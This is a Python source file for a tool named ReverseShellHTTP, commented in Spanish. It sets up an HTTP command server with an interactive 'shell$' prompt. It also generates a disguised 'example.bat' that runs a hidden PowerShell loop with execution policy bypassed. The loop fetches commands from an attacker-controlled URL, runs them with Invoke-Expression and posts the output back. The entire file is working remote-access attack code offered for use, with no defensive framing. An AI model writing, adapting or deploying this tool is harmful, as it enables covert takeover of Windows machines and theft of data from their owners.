#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Herramienta: ReverseShellHTTP
# Desarrollado por: fr4nXploit
# Descripción: Reverse shell vía HTTP utilizando PowerShell en el lado del cliente y Python en el lado del servidor.
# GitHub: https://github.com/fr4nXploit

import os
import time
import sys

# Función para mostrar la ayuda
def mostrar_ayuda():
    print("""
Uso: python script.py <url> <puerto>

Este script genera un archivo .bat que ejecuta un script de PowerShell en segundo plano. 
Opciones:
  -h     Muestra esta ayuda y termina.
  
Parámetros:
  <url>    La URL del servidor (por ejemplo, una URL de Ngrok).
  <puerto> El puerto en el cual se ejecutará el servidor.

Ejemplo:
  python script.py https://mi-servidor.ngrok.io 8080
    """)
    sys.exit(0)

# Verificación de los argumentos proporcionados
if len(sys.argv) != 3:
    if len(sys.argv) == 2 and sys.argv[1] == "-h":
        mostrar_ayuda()
    else:
        print("Error: Parámetros incorrectos.\n")
        mostrar_ayuda()

# Parámetros de la URL y Puerto
url = sys.argv[1]
port = int(sys.argv[2])

HOST_NAME = '0.0.0.0'
PORT_NUMBER = port
COMMAND_FILE = 'command.txt'
OUTPUT_FILE = 'output.txt'
LOG_FILE = 'command_log.txt'
BAT_FILE = 'example.bat'

# Contenido del script de PowerShell en una sola línea
powershell_script = f"""
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$OutputDir = '.\\output'; if (-not (Test-Path $OutputDir)) {{ New-Item -Path $OutputDir -ItemType Directory -Force; attrib +h $OutputDir }}; $OutputFile = Join-Path $OutputDir 'output.txt'; while ($true) {{ try {{ Write-Output 'Intentando obtener el comando desde el servidor...'; $command = Invoke-WebRequest -Uri '{url}/command.txt' -UseBasicParsing -Headers @{{'ngrok-skip-browser-warning'='true'}}; if ($command -and $command.Content) {{ Write-Output 'Comando recibido: $($command.Content)'; try {{ Invoke-Expression $command.Content 2>&1 | Out-File -FilePath $OutputFile -Encoding utf8 -Force }} catch {{ Write-Output 'Error ejecutando el comando: $_'; Continue }} Write-Output 'Enviando la salida del comando al servidor...'; Invoke-WebRequest -Uri '{url}/output.txt' -Method Post -InFile $OutputFile -UseBasicParsing -Headers @{{'ngrok-skip-browser-warning'='true'}}; Write-Output 'Salida enviada con éxito.'; Remove-Item $OutputFile -Force }} else {{ Write-Output 'No se recibió ningún comando o el comando estaba vacío.' }} }} catch {{ Write-Output 'Error al comunicarse con el servidor: $_' }} Start-Sleep -Seconds 5 }}"
"""

# Función para crear el archivo .bat que ejecuta el script de PowerShell en segundo plano
def create_bat_file():
    bat_content = f"@echo off\n{powershell_script}"
    with open(BAT_FILE, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f"Archivo .bat creado exitosamente: {BAT_FILE}")

# Clase manejadora del servidor HTTP
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return  # Sobrescribimos para no mostrar el log de solicitudes

    def do_GET(self):
        if self.path == f'/{COMMAND_FILE}':
            if os.path.exists(COMMAND_FILE):
                with open(COMMAND_FILE, 'r') as f:
                    command = f.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(command.encode('utf-8'))
                    os.remove(COMMAND_FILE)  # Borrar el archivo después de leerlo
            else:
                self.send_response(404)
                self.end_headers()

    def do_POST(self):
        if self.path == f'/{OUTPUT_FILE}':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            with open(OUTPUT_FILE, 'wb') as f:
                f.write(post_data)
            self.send_response(200)
            self.end_headers()
            global output_data
            output_data = post_data.decode('utf-8')

            # Guardar el comando y la salida en el archivo de log
            with open(LOG_FILE, 'a') as log_file:
                log_file.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] Comando ejecutado: {last_command}\n')
                log_file.write(f'Salida recibida:\n{output_data}\n\n')

if __name__ == '__main__':
    output_data = None
    last_command = None  # Para almacenar el último comando ejecutado

    # Crear el archivo .bat al iniciar el script
    create_bat_file()

    # Mensaje de conexión exitosa
    with open(COMMAND_FILE, 'w') as f:
        f.write('echo "Conexion establecida satisfactoriamente"')
    print("Esperando respuesta de la máquina Windows.")

    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)
    print(f'Servidor corriendo en http://{HOST_NAME}:{PORT_NUMBER}')

    # Esperar a que se ejecute el primer comando antes de mostrar shell$
    while output_data is None:
        httpd.handle_request()

    print(f"Salida del comando:\n{output_data}")
    output_data = None

    # Iniciar el ciclo normal con shell$
    while True:
        command = input("shell$ ")
        if command.lower() == "exit":
            last_command = command
            with open(COMMAND_FILE, 'w') as f:
                f.write(command)
            print(f"Comando '{command}' enviado a la máquina Windows.")
            
            # Enviar un mensaje final y cerrar el servidor
            with open(COMMAND_FILE, 'w') as f:
                f.write('echo "Conexión terminada"')
            print("Conexión terminada. Cerrando servidor...")

            # Cerrar el servidor y salir del ciclo
            httpd.server_close()
            break

        last_command = command  # Almacenar el comando para guardarlo en el log
        with open(COMMAND_FILE, 'w') as f:
            f.write(command)
        print(f"Comando '{command}' enviado a la máquina Windows.")

        # Esperar hasta que el archivo output.txt sea recibido
        while output_data is None:
            httpd.handle_request()  # Procesar la solicitud de POST y esperar el archivo output.txt

        # Mostrar la salida del comando y limpiar para la siguiente ejecución
        print(f"Salida del comando:\n{output_data}")
        output_data = None
